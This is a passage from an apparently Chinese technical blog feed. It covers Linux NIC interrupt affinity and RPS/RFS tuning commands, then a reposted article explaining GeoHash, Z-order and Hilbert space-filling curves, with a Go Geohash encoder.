class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;1&quot;</span> &gt; /proc/irq/31/smp_affinity<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;1&quot;</span> &gt; /proc/irq/32/smp_affinity<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;2&quot;</span> &gt; /proc/irq/33/smp_affinity<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;2&quot;</span> &gt; /proc/irq/34/smp_affinity<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;4&quot;</span> &gt; /proc/irq/35/smp_affinity<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;4&quot;</span> &gt; /proc/irq/36/smp_affinity<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;8&quot;</span> &gt; /proc/irq/37/smp_affinity<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;8&quot;</span> &gt; /proc/irq/38/smp_affinity<br></code></pre></td></tr></table></figure><h4 id="2-4-2、通过irqbalance配置"><a href="#2-4-2、通过irqbalance配置" class="headerlink" title="2.4.2、通过irqbalance配置"></a>2.4.2、通过irqbalance配置</h4><p>irqbalance避免所有的IRQ请求都由单一的CPU负担，从而将硬件中断分布到多处理器系统的各个处理器以便能够提高性能，安装方式为：<code>yum -y install irqbalance</code>；</p><p><strong>基本原理</strong>：周期计算各个CPU上的中断数量，发现不均衡时，动态通过<code>/proc</code>接口设置指定中断的CPU亲和性，进行绑定。当只有一个中断时，无论将这个中断绑定到哪个CPU，都会不均衡。</p><p><strong>需要注意</strong>：</p><ul><li>启动<code>irqbalance</code>后，手动绑定将失效；</li><li>当CPU工作在最高性能模式时，<code>irqbalance</code>会均匀分配中断到其他CPU，节能模式时中断会集中分配到CPU0；</li><li>irqbalance进行均衡的粒度为<strong>不同的中断</strong>，当系统中有很多不同类型的中断，基本有用，如果只有一个中断(或者少量中断)，此时irqbalance无能为力；</li></ul><h2 id="三、网卡单队列下的网卡软中断的均衡方案"><a href="#三、网卡单队列下的网卡软中断的均衡方案" class="headerlink" title="三、网卡单队列下的网卡软中断的均衡方案"></a>三、网卡单队列下的网卡软中断的均衡方案</h2><p><code>RPS/RFS</code> 来解决在单队列网卡下的<code>软中断</code>的负载绑定问题，在<code>硬中断</code>不均衡情况下，通过使<code>软中断</code>均衡，达到CPU占用均衡的目的，该功能出现在内核版本<code>2.6.35</code>中，由<code>Google</code>的两位工程师提交。</p><p><code>RPS（Receive Packet Steering）</code>主要是把<code>软中断</code>的负载均衡到各个<code>CPU</code>，简单来说，是网卡驱动对每个流（针对收包过程）生成一个<code>hash标识</code>，这个HASH值得计算可以通过四元组来计算（<code>SIP</code>，<code>SPORT</code>，<code>DIP</code>，<code>DPORT</code>），然后由中断处理的地方根据这个<code>hash标识</code>分配到相应的<code>CPU</code>上去，这样就可以比较充分的发挥多核的能力了。通俗点来说就是在软件层面模拟实现硬件的多队列网卡功能，如果网卡本身支持多队列功能的话RPS就不会有任何的作用。该功能主要针对单队列网卡多CPU环境。示意图如下所示：</p><p><img src="/assets/images/network-queue-rps.png" alt="RPS" loading="lazy"></p><p><code>RFS（Receive Flow Steering）</code>是RPS的扩展，<code>RPS</code>只依靠<code>hash</code>来控制数据包，提供负载平衡，但是没有考虑到<code>应用程序的位置</code>（指应用程序所在CPU）。<code>RFS</code>目标是通过指派应用线程正在运行的CPU处理中断，增加数据缓存的命中率。示意图如下所示：</p><p><img src="/assets/images/network-queue-rfs.png" alt="RFS" loading="lazy"></p><h3 id="3-1、与网卡多队列的区别"><a href="#3-1、与网卡多队列的区别" class="headerlink" title="3.1、与网卡多队列的区别"></a>3.1、与网卡多队列的区别</h3><ul><li>RPS&#x2F;RFS：平衡一个<code>RX Queue</code>的<code>软中断</code>到不同逻辑CPU上；</li><li>网卡多队列：RSS（Receive Side Scaling）是网卡的<code>硬件特性</code>（需要硬件支持），实现了多队列，多队列是<code>RX/TX多个通路</code>，分别负责各种的中断，可以将不同的流分发到不同的CPU上；</li></ul><h3 id="3-2、开启RPS特性脚本"><a href="#3-2、开启RPS特性脚本" class="headerlink" title="3.2、开启RPS特性脚本"></a>3.2、开启RPS特性脚本</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br>cpu_num=$(grep -c processor /proc/cpuinfo)<br>quotient=$((cpu_num/<span class="hljs-number">8</span>))<br><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$quotient</span> -gt 2 ]; <span class="hljs-keyword">then</span><br>quotient=2<br><span class="hljs-keyword">elif</span> [ <span class="hljs-variable">$quotient</span> -lt 1 ]; <span class="hljs-keyword">then</span><br>quotient=1<br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> $(<span class="hljs-built_in">seq</span> <span class="hljs-variable">$quotient</span>)<br><span class="hljs-keyword">do</span><br>cpuset=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;cpuset&#125;</span>f&quot;</span><br><span class="hljs-keyword">done</span><br><span class="hljs-keyword">for</span> rps_file <span class="hljs-keyword">in</span> $(<span class="hljs-built_in">ls</span> /sys/class/net/eth*/queues/rx-*/rps_cpus)<br><span class="hljs-keyword">do</span><br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$cpuset</span> &gt; <span class="hljs-variable">$rps_file</span><br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><h2 id="四、相关指令"><a href="#四、相关指令" class="headerlink" title="四、相关指令"></a>四、相关指令</h2><h3 id="4-1、观察中断变化"><a href="#4-1、观察中断变化" class="headerlink" title="4.1、观察中断变化"></a>4.1、观察中断变化</h3><p>可以使用<code>watch</code>指令组合<code>/proc/interrupts</code>文件查看中断的变化情况：<code>watch -d -n 1 cat /proc/interrupts</code>，参考信息如下所示：</p><p><img src="/assets/images/network-queue-proc-interrupts-change.png" alt="&#x2F;proc&#x2F;interrupts文件变化" loading="lazy"></p><h3 id="4-2、分析CPU的处理耗时"><a href="#4-2、分析CPU的处理耗时" class="headerlink" title="4.2、分析CPU的处理耗时"></a>4.2、分析CPU的处理耗时</h3><p>使用<code>mpstat -P ALL 1</code>分析CPU在处理各种类型上所花费的时间比例，可用于分析CPU是否忙于处理中断（对应项为：<code>%irq</code>），参考如下图所示；</p><p><img src="/assets/images/network-queue-mpstat.png" alt="mpstat展示" loading="lazy"></p><h3 id="4-3、分析CPU的各类利用率"><a href="#4-3、分析CPU的各类利用率" class="headerlink" title="4.3、分析CPU的各类利用率"></a>4.3、分析CPU的各类利用率</h3><p>使用<code>top</code>指令后，按<code>1</code>显示各个CPU的各项利用率分布详情，参考如下图所示：</p><p><img src="/assets/images/network-queue-top.png" alt="top展示" loading="lazy"></p><h3 id="4-4、设置进程的CPU亲和性"><a href="#4-4、设置进程的CPU亲和性" class="headerlink" title="4.4、设置进程的CPU亲和性"></a>4.4、设置进程的CPU亲和性</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看进程的CPU亲和性</span><br>[root@bugwz ~]# taskset -p 13716<br>pid 13716<span class="hljs-string">&#x27;s current affinity mask: ffffffff</span><br><span class="hljs-string"></span><br><span class="hljs-string"># 设置进程的CPU亲和性</span><br><span class="hljs-string">[root@bugwz ~]# taskset -p 1 13716</span><br><span class="hljs-string">pid 13716&#x27;</span>s current affinity mask: ffffffff<br>pid 13716<span class="hljs-string">&#x27;s new affinity mask: 1</span><br><span class="hljs-string"></span><br><span class="hljs-string"># 将一个进程绑定到多个CPU上</span><br><span class="hljs-string">[root@bugwz ~]# taskset -p -c 1,3 13716</span><br><span class="hljs-string">pid 13716&#x27;</span>s current affinity list: 0<br>pid 13716<span class="hljs-string">&#x27;s new affinity list: 1,3</span><br><span class="hljs-string"></span><br><span class="hljs-string">[root@bugwz ~]# taskset -p -c 1-7 13716</span><br><span class="hljs-string">pid 13716&#x27;</span>s current affinity list: 1,3<br>pid 13716<span class="hljs-string">&#x27;s new affinity list: 1-7</span><br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 网络 </tag>
            
            <tag> Interrupt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>转 - 高效的多维空间点索引算法 GeoHash 和 GoogleS2</title>
      <link href="/2019/11/27/geohash-s2/"/>
      <url>/2019/11/27/geohash-s2/</url>
      
        <content type="html"><![CDATA[<h2 id="引子"><a href="#引子" class="headerlink" title="引子"></a>引子</h2><p>每天我们晚上加班回家，可能都会用到滴滴或者共享单车。打开 app 会看到如下的界面：</p><p><img src="/assets/images/geohash-s2-1.png" alt="App Photo" loading="lazy"></p><p>app 界面上会显示出自己附近一个范围内可用的出租车或者共享单车。假设地图上会显示以自己为圆心，5公里为半径，这个范围内的车。如何实现呢？最直观的想法就是去数据库里面查表，计算并查询车距离用户小于等于5公里的，筛选出来，把数据返回给客户端。</p><p>这种做法比较笨，一般也不会这么做。为什么呢？因为这种做法需要对整个表里面的每一项都计算一次相对距离。太耗时了。既然数据量太大，我们就需要分而治之。那么就会想到把地图分块。这样即使每一块里面的每条数据都计算一次相对距离，也比之前全表都计算一次要快很多。</p><p>我们也都知道，现在用的比较多的数据库 MySQL、PostgreSQL 都原生支持 B+ 树。这种数据结构能高效的查询。地图分块的过程其实就是一种添加索引的过程，如果能想到一个办法，把地图上的点添加一个合适的索引，并且能够排序，那么就可以利用类似二分查找的方法进行快速查询。</p><p>问题就来了，地图上的点是二维的，有经度和纬度，这如何索引呢？如果只针对其中的一个维度，经度或者纬度进行搜索，那搜出来一遍以后还要进行二次搜索。那要是更高维度呢？三维。可能有人会说可以设置维度的优先级，比如拼接一个联合键，那在三维空间中，x，y，z 谁的优先级高呢？设置优先级好像并不是很合理。</p><p>本篇文章就来介绍2种比较通用的空间点索引算法。</p><h2 id="一、-GeoHash-算法"><a href="#一、-GeoHash-算法" class="headerlink" title="一、 GeoHash 算法"></a>一、 GeoHash 算法</h2><h3 id="1-1、-Geohash-算法简介"><a href="#1-1、-Geohash-算法简介" class="headerlink" title="1.1、 Geohash 算法简介"></a>1.1、 Geohash 算法简介</h3><p>Geohash 是一种地理编码，由 <a href="https://en.wikipedia.org/w/index.php?title=Gustavo_Niemeyer&action=edit&redlink=1">Gustavo Niemeyer</a> 发明的。它是一种分级的数据结构，把空间划分为网格。Geohash 属于空间填充曲线中的 Z 阶曲线（<a href="https://en.wikipedia.org/wiki/Z-order_curve">Z-order curve</a>）的实际应用何为 Z 阶曲线？</p><p><img src="/assets/images/geohash-s2-2.png" alt="二维的Z阶曲线" loading="lazy"></p><p>上图就是 Z 阶曲线。这个曲线比较简单，生成它也比较容易，只需要把每个 Z 首尾相连即可。</p><p><img src="/assets/images/geohash-s2-3.png" alt="三维的Z阶曲线" loading="lazy"></p><p>Z 阶曲线同样可以扩展到三维空间。只要 Z 形状足够小并且足够密，也能填满整个三维空间。</p><p>说到这里可能读者依旧一头雾水，不知道 Geohash 和 Z 曲线究竟有啥关系？其实 Geohash算法 的理论基础就是基于 Z 曲线的生成原理。继续说回 Geohash。</p><p>Geohash 能够提供任意精度的分段级别。一般分级从 1-12 级。</p><p><img src="/assets/images/geohash-s2-4.png" alt="Geohash精度级别" loading="lazy"></p><p>还记得引语里面提到的问题么？这里我们就可以用 Geohash 来解决这个问题。</p><p>我们可以利用 Geohash 的字符串长短来决定要划分区域的大小。这个对应关系可以参考上面表格里面 cell 的宽和高。一旦选定 cell 的宽和高，那么 Geohash 字符串的长度就确定下来了。这样我们就把地图分成了一个个的矩形区域了。</p><p>地图上虽然把区域划分好了，但是还有一个问题没有解决，那就是如何快速的查找一个点附近邻近的点和区域呢？</p><p>Geohash 有一个和 Z 阶曲线相关的性质，那就是一个点附近的地方(但不绝对) hash 字符串总是有公共前缀，并且公共前缀的长度越长，这两个点距离越近。</p><p>由于这个特性，Geohash 就常常被用来作为唯一标识符。用在数据库里面可用 Geohash 来表示一个点。Geohash 这个公共前缀的特性就可以用来快速的进行邻近点的搜索。越接近的点通常和目标点的 Geohash 字符串公共前缀越长（但是这不一定，也有特殊情况，下面举例会说明）</p><p>Geohash 也有几种编码形式，常见的有2种，<a href="%5Bhttps://bugwz.com/2019/11/18/basex/#%E4%BA%8C-base32%5D(https://bugwz.com/2019/11/18/basex/#%E4%BA%8C-base32)">Base 32</a> 和 <a href="%5Bhttps://bugwz.com/2019/11/18/basex/#%E5%85%AB-base-x-2-36%5D(https://bugwz.com/2019/11/18/basex/#%E5%85%AB-base-x-2-36)">Base 36</a>。</p><h3 id="1-2、-Geohash-实际应用举例"><a href="#1-2、-Geohash-实际应用举例" class="headerlink" title="1.2、 Geohash 实际应用举例"></a>1.2、 Geohash 实际应用举例</h3><p>接下来的举例以 base-32 为例。举个例子。</p><p><img src="/assets/images/geohash-s2-5.png" alt="演示地图" loading="lazy"></p><p>上图是一个地图，地图中间有一个美罗城，假设需要查询距离美罗城最近的餐馆，该如何查询？</p><p>第一步我们需要把地图网格化，利用 geohash。通过查表，我们选取字符串长度为6的矩形来网格化这张地图。</p><p>经过查询，美罗城的经纬度是[31.1932993, 121.43960190000007]。</p><p>先处理纬度。地球的纬度区间是[-90,90]。把这个区间分为2部分，即[-90,0)，[0,90]。31.1932993位于(0,90]区间，即右区间，标记为1。然后继续把(0,90]区间二分，分为[0,45)，[45,90]，31.1932993位于[0,45)区间，即左区间，标记为0。一直划分下去。</p><p><img src="/assets/images/geohash-s2-6.png" alt="纬度拆分细节图" loading="lazy"></p><p>再处理经度，一样的处理方式。地球经度区间是[-180,180]</p><p><img src="/assets/images/geohash-s2-7.png" alt="精度拆分细节图" loading="lazy"></p><p>纬度产生的二进制是101011000101110，经度产生的二进制是110101100101101，按照**“偶数位放经度，奇数位放纬度”**的规则，重新组合经度和纬度的二进制串，生成新的：111001100111100000110011110110，最后一步就是把这个最终的字符串转换成字符，对应需要查找 base-32 的表。11100 11001 11100 00011 00111 10110转换成十进制是 28 25 28 3 7 22，查表编码得到最终结果，wtw37q。</p><p>我们还可以把这个网格周围8个各自都计算出来。</p><p><img src="/assets/images/geohash-s2-8.png" alt="精度为6的网格表示" loading="lazy"></p><p>从地图上可以看出，这邻近的9个格子，前缀都完全一致。都是wtw37。</p><p>如果我们把字符串再增加一位，会有什么样的结果呢？Geohash 增加到7位。</p><p><img src="/assets/images/geohash-s2-9.png" alt="精度为7的网格表示" loading="lazy"></p><p>当Geohash 增加到7位的时候，网格更小了，美罗城的 Geohash 变成了 wtw37qt。</p><p>看到这里，读者应该已经清楚了 Geohash 的算法原理了。咱们把6位和7位都组合到一张图上面来看。</p><p><img src="/assets/images/geohash-s2-10.png" alt="精度为6&#x2F;7的网格组合表示" loading="lazy"></p><p>可以看到中间大格子的 Geohash 的值是 wtw37q，那么它里面的所有小格子前缀都是 wtw37q。可以想象，当 Geohash 字符串长度为5的时候，Geohash 肯定就为 wtw37 了。</p><p>接下来解释之前说的 Geohash 和 Z 阶曲线的关系。回顾最后一步合并经纬度字符串的规则，<strong>“偶数位放经度，奇数位放纬度”</strong>。读者一定有点好奇，这个规则哪里来的？凭空瞎想的？其实并不是，这个规则就是 Z 阶曲线。看下图：</p><p><img src="/assets/images/geohash-s2-11.png" alt="Z阶曲线" loading="lazy"></p><p>x 轴就是纬度，y轴就是经度。经度放偶数位，纬度放奇数位就是这样而来的。</p><p>最后有一个精度的问题，下面的表格数据一部分来自 Wikipedia。</p><p><img src="/assets/images/geohash-s2-12.png" alt="Z阶曲线的精度问题" loading="lazy"></p><h3 id="1-3、-Geohash-具体实现"><a href="#1-3、-Geohash-具体实现" class="headerlink" title="1.3、 Geohash 具体实现"></a>1.3、 Geohash 具体实现</h3><p>到此，读者应该对 Geohash 的算法都很明了了。接下来用 Go 实现一下 Geohash 算法。</p><figure class="highlight go"><table><tr><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> geohash<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;bytes&quot;</span><br>)<br><br><span class="hljs-keyword">const</span> (<br>BASE32                = <span class="hljs-string">&quot;0123456789bcdefghjkmnpqrstuvwxyz&quot;</span><br>MAX_LATITUDE  <span class="hljs-type">float64</span> = <span class="hljs-number">90</span><br>MIN_LATITUDE  <span class="hljs-type">float64</span> = <span class="hljs-number">-90</span><br>MAX_LONGITUDE <span class="hljs-type">float64</span> = <span class="hljs-number">180</span><br>MIN_LONGITUDE <span class="hljs-type">float64</span> = <span class="hljs-number">-180</span><br>)<br><br><span class="hljs-keyword">var</span> (<br>bits   = []<span class="hljs-type">int</span>&#123;<span class="hljs-number">16</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>&#125;<br>base32 = []<span class="hljs-type">byte</span>(BASE32)<br>)<br><br><span class="hljs-keyword">type</span> Box <span class="hljs-keyword">struct</span> &#123;<br>MinLat, MaxLat <span class="hljs-type">float64</span> <span class="hljs-comment">// 纬度</span><br>MinLng, MaxLng <span class="hljs-type">float64</span> <span class="hljs-comment">// 经度</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(this *Box)</span></span> Width() <span class="hljs-type">float64</span> &#123;<br><span class="hljs-keyword">return</span> this.MaxLng - this.MinLng<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(this *Box)</span></span> Height() <span class="hljs-type">float64</span> &#123;<br><span class="hljs-keyword">return</span> this.MaxLat - this.MinLat<br>&#125;<br><br><span class="hljs-comment">// 输入值：纬度，经度，精度(geohash的长度)</span><br><span class="hljs-comment">// 返回geohash, 以及该点所在的区域</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Encode</span><span class="hljs-params">(latitude, longitude <span class="hljs-type">float64</span>, precision <span class="hljs-type">int</span>)</span></span> (<span class="hljs-type">string</span>, *Box) &#123;<br><span class="hljs-keyword">var</span> geohash bytes.Buffer<br><span class="hljs-keyword">var</span> minLat, maxLat <span class="hljs-type">float64</span> = MIN_LATITUDE, MAX_LATITUDE<br><span class="hljs-keyword">var</span> minLng, maxLng <span class="hljs-type">float64</span> = MIN_LONGITUDE, MAX_LONGITUDE<br><span class="hljs-keyword">var</span> mid <span class="hljs-type">float64</span> = <span class="hljs-number">0</span><br><br>bit, ch, length, isEven := <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">true</span><br><span class="hljs-keyword">for</span> length &lt; precision &#123;<br><span class="hljs-keyword">if</span> isEven &#123;<br><span class="hljs-keyword">if</span> mid = (minLng + maxLng) / <span class="hljs-number">2</span>; mid &lt; longitude &#123;<br>ch |= bits[bit]<br>minLng = mid<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>maxLng = mid<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> mid = (minLat + maxLat) / <span class="hljs-number">2</span>; mid &lt; latitude &#123;<br>ch |= bits[bit]<br>minLat = mid<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>maxLat = mid<br>&#125;<br>&#125;<br><br>isEven = !isEven<br><span class="hljs-keyword">if</span> bit &lt; <span class="hljs-number">4</span> &#123;<br>bit++<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>geohash.WriteByte(base32[ch])<br>length, bit, ch = length+<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>&#125;<br>&#125;<br><br>b := &amp;Box&#123;<br>MinLat: minLat,<br>MaxLat: maxLat,<br>MinLng: minLng,<br>MaxLng: maxLng,<br>&#125;<br><br><span class="hljs-keyword">return</span> geohash.String(), b<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="1-4、-Geohash-的优缺点"><a href="#1-4、-Geohash-的优缺点" class="headerlink" title="1.4、 Geohash 的优缺点"></a>1.4、 Geohash 的优缺点</h3><p>Geohash 的优点很明显，它利用 Z 阶曲线进行编码。而 Z 阶曲线可以将二维或者多维空间里的所有点都转换成一维曲线。在数学上成为分形维。并且 Z 阶曲线还具有局部保序性。</p><p>Z 阶曲线通过交织点的坐标值的二进制表示来简单地计算多维度中的点的z值。一旦将数据被加到该排序中，任何一维数据结构，例如二叉搜索树，B树，跳跃表或（具有低有效位被截断）哈希表 都可以用来处理数据。通过 Z 阶曲线所得到的顺序可以等同地被描述为从四叉树的深度优先遍历得到的顺序。</p><p>这也是 Geohash 的另外一个优点，搜索查找邻近点比较快。</p><p>Geohash 的缺点之一也来自 Z 阶曲线。</p><p>Z 阶曲线有一个比较严重的问题，虽然有局部保序性，但是它也有突变性。在每个 Z 字母的拐角，都有可能出现顺序的突变。</p><p><img src="/assets/images/geohash-s2-13.png" alt="Z阶曲线的拐角问题展示" loading="lazy"></p><p>看上图中标注出来的蓝色的点点。每两个点虽然是相邻的，但是距离相隔很远。看右下角的图，两个数值邻近红色的点两者距离几乎达到了整个正方形的边长。两个数值邻近绿色的点也达到了正方形的一半的长度。</p><p>Geohash 的另外一个缺点是，如果选择不好合适的网格大小，判断邻近点可能会比较麻烦。</p><p><img src="/assets/images/geohash-s2-14.png" alt="Geohash的临近点判断问题" loading="lazy"></p><p>看上图，如果选择 Geohash 字符串为6的话，就是蓝色的大格子。红星是美罗城，紫色的圆点是搜索出来的目标点。如果用 Geohash 算法查询的话，距离比较近的可能是 wtw37p，wtw37r，wtw37w，wtw37m。但是其实距离最近的点就在 wtw37q。如果选择这么大的网格，就需要再查找周围的8个格子。</p><p>如果选择 Geohash 字符串为7的话，那变成黄色的小格子。这样距离红星星最近的点就只有一个了。就是 wtw37qw。</p><p>如果网格大小，精度选择的不好，那么查询最近点还需要再次查询周围8个点。</p><h2 id="二、-空间填充曲线-和-分形"><a href="#二、-空间填充曲线-和-分形" class="headerlink" title="二、 空间填充曲线 和 分形"></a>二、 空间填充曲线 和 分形</h2><p>在介绍第二种多维空间点索引算法之前，要先谈谈空间填充曲线(Space-filling curve)和分形。</p><p>解决多维空间点索引需要解决2个问题，第一，如何把多维降为低维或者一维？第二，一维的曲线如何分形？</p><h3 id="2-1、-空间填充曲线"><a href="#2-1、-空间填充曲线" class="headerlink" title="2.1、 空间填充曲线"></a>2.1、 空间填充曲线</h3><p>在数学分析中，有这样一个难题：能否用一条无限长的线，穿过任意维度空间里面的所有点？</p><p><img src="/assets/images/geohash-s2-15.png" alt="空间填充曲线" loading="lazy"></p><p>在1890年，Giuseppe Peano 发现了一条连续曲线，现在称为 Peano 曲线，它可以穿过单位正方形上的每个点。他的目的是构建一个可以从单位区间到单位正方形的连续映射。 Peano 受到 Georg Cantor 早期违反直觉的研究结果的启发，即单位区间中无限数量的点与任何有限维度流型（<a href="https://en.wikipedia.org/wiki/Manifold">manifold</a>）中无限数量的点，基数相同。 Peano 解决的问题实质就是，是否存在这样一个连续的映射，一条能填充满平面的曲线。上图就是他找到的一条曲线。</p><p>一般来说，一维的东西是不可能填满2维的方格的。但是皮亚诺曲线恰恰给出了反例。皮亚诺曲线是一条连续的但处处不可导的曲线。</p><p>皮亚诺曲线的构造方法如下：取一个正方形并且把它分出九个相等的小正方形，然后从左下角的正方形开始至右上角的正方形结束，依次把小正方形的中心用线段连接起来；下一步把每个小正方形分成九个相等的正方形，然后上述方式把其中中心连接起来……将这种操作手续无限进行下去，最终得到的极限情况的曲线就被称作皮亚诺曲线。</p><p>皮亚诺对区间[0，1]上的点和正方形上的点的映射作了详细的数学描述。实际上，正方形的这些点对于<img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/31a5c18739ff04858eecc8fec2f53912c348e0e5" alt="img" loading="lazy">，可找到两个连续函数 x &#x3D; f(t) 和 y &#x3D; g(t)，使得 x 和 y 取属于单位正方形的每一个值。</p><p>一年后，即1891年，<a href="https://zh.wikipedia.org/wiki/%E5%B8%8C%E5%B0%94%E4%BC%AF%E7%89%B9">希尔伯特</a>就作出了这条曲线，叫希尔伯特曲线（Hilbert curve）。</p><p><img src="/assets/images/geohash-s2-16.png" alt="1-6阶的希尔伯特曲线" loading="lazy"></p><p><img src="/assets/images/geohash-s2-17.png" alt="三维空间的希尔伯特曲线" loading="lazy"></p><p>之后还有很多变种的空间填充曲线，龙曲线(Dragon curve)、 高斯帕曲线(Gosper curve)、Koch曲线(Koch curve)、摩尔定律曲线(Moore curve)、谢尔宾斯基曲线(Sierpiński curve)、奥斯古德曲线(Osgood curve)。这些曲线和本文无关，就不详细介绍了。</p><p><img src="/assets/images/geohash-s2-18.png" alt="龙曲线" loading="lazy"></p><p><img src="/assets/images/geohash-s2-19.png" alt="高斯帕曲线" loading="lazy"></p><p><img src="/assets/images/geohash-s2-20.png" alt="Koch曲线" loading="lazy"></p><p><img src="/assets/images/geohash-s2-21.png" alt="im" loading="lazy"></p><p><img src="/assets/images/geohash-s2-22.png" alt="im" loading="lazy"></p><p>在数学分析中，空间填充曲线是一个参数化的注入函数，它将单位区间映射到单位正方形，立方体，更广义的，n维超立方体等中的连续曲线，随着参数的增加，它可以任意接近单位立方体中的给定点。除了数学重要性之外，空间填充曲线也可用于降维，数学规划，稀疏多维数据库索引，电子学和生物学。空间填充曲线的现在被用在互联网地图中。</p><h3 id="2-2、-分形"><a href="#2-2、-分形" class="headerlink" title="2.2、 分形"></a>2.2、 分形</h3><p>皮亚诺曲线的出现，说明了人们对维数的认识是有缺陷的，有必要重新考察维数的定义。这就是<a href="https://zh.wikipedia.org/wiki/%E5%88%86%E5%BD%A2%E5%87%A0%E4%BD%95">分形几何</a>考虑的问题。在分形几何中，维数可以是分数叫做分维。</p><p>多维空间降维以后，如何分形，也是一个问题。分形的方式有很多种，这里有一个<a href="https://en.wikipedia.org/wiki/List_of_fractals_by_Hausdorff_dimension">列表</a>，可以查看如何分形，以及每个分形的分形维数，即豪斯多夫分形维(Hausdorff fractals dimension)和拓扑维数。这里就不细说分形的问题了，感兴趣的可以仔细阅读链接里面的内容。</p><p>接下来继续来说多维空间点索引算法，下面一个算法的理论基础来自希尔伯特曲线，先来仔细说说希尔伯特曲线。</p><h2 id="三、-Hilbert-Curve-希尔伯特曲线"><a href="#三、-Hilbert-Curve-希尔伯特曲线" class="headerlink" title="三、 Hilbert Curve 希尔伯特曲线"></a>三、 Hilbert Curve 希尔伯特曲线</h2><h3 id="3-1、-希尔伯特曲线的定义"><a href="#3-1、-希尔伯特曲线的定义" class="headerlink" title="3.1、 希尔伯特曲线的定义"></a>3.1、 希尔伯特曲线的定义</h3><p><img src="/assets/images/geohash-s2-23.png" alt="希尔伯特曲线" loading="lazy"></p><p><strong>希尔伯特曲线</strong>一种能填充满一个平面正方形的分形曲线（<a href="https://zh.wikipedia.org/w/index.php?title=%E7%A9%BA%E9%96%93%E5%A1%AB%E5%85%85%E6%9B%B2%E7%B7%9A&action=edit&redlink=1">空间填充曲线</a>），由<a href="https://zh.wikipedia.org/wiki/%E5%A4%A7%E8%A1%9B%C2%B7%E5%B8%8C%E7%88%BE%E4%BC%AF%E7%89%B9">大卫·希尔伯特</a>在1891年提出。</p><p>由于它能填满平面，它的<a href="https://zh.wikipedia.org/wiki/%E8%B1%AA%E6%96%AF%E5%A4%9A%E5%A4%AB%E7%B6%AD">豪斯多夫维</a>是2。取它填充的正方形的边长为1，第n步的希尔伯特曲线的长度是2^n - 2^(-n)。</p><h3 id="3-2、-希尔伯特曲线的构造方法"><a href="#3-2、-希尔伯特曲线的构造方法" class="headerlink" title="3.2、 希尔伯特曲线的构造方法"></a>3.2、 希尔伯特曲线的构造方法</h3><p>一阶的希尔伯特曲线，生成方法就是把正方形四等分，从其中一个子正方形的中心开始，依次穿线，穿过其余3个正方形的中心。</p><p><img src="/assets/images/geohash-s2-24.png" alt="希尔伯特曲线的构造方法" loading="lazy"></p><p>二阶的希尔伯特曲线，生成方法就是把之前每个子正方形继续四等分，每4个小的正方形先生成一阶希尔伯特曲线。然后把4个一阶的希尔伯特曲线首尾相连。</p><p><img src="/assets/images/geohash-s2-25.png" alt="希尔伯特曲线的构造方法" loading="lazy"></p><p>三阶的希尔伯特曲线，生成方法就是与二阶类似，先生成二阶希尔伯特曲线。然后把4个二阶的希尔伯特曲线首尾相连。</p><p><img src="/assets/images/geohash-s2-26.png" alt="希尔伯特曲线的构造方法" loading="lazy"></p><p>n阶的希尔伯特曲线的生成方法也是递归的，先生成n-1阶的希尔伯特曲线，然后把4个n-1阶的希尔伯特曲线首尾相连。</p><p><img src="/assets/images/geohash-s2-27.png" alt="希尔伯特曲线的构造方法" loading="lazy"></p><h3 id="3-3、-为何要选希尔伯特曲线"><a href="#3-3、-为何要选希尔伯特曲线" class="headerlink" title="3.3、 为何要选希尔伯特曲线"></a>3.3、 为何要选希尔伯特曲线</h3><p>看到这里可能就有读者有疑问了，这么多空间填充曲线，为何要选希尔伯特曲线？</p><p>因为希尔伯特曲线有非常好的特性。</p><h4 id="3-3-1、降维"><a href="#3-3-1、降维" class="headerlink" title="3.3.1、降维"></a>3.3.1、降维</h4><p>首先，作为空间填充曲线，希尔伯特曲线可以对多维空间有效的降维。</p><p><img src="/assets/images/geohash-s2-28.png" alt="希尔伯特曲线将平面上的点展开成一维的线" loading="lazy"></p><p>上图就是希尔伯特曲线在填满一个平面以后，把平面上的点都展开成一维的线了。</p><p>可能有人会有疑问，上图里面的希尔伯特曲线只穿了16个点，怎么能代表一个平面呢？</p><p><img src="/assets/images/geohash-s2-29.png" alt="n阶希尔伯特曲线" loading="lazy"></p><p>当然，当n趋近于无穷大的时候，n阶希尔伯特曲线就可以近似填满整个平面了。</p><h4 id="稳定"><a href="#稳定" class="headerlink" 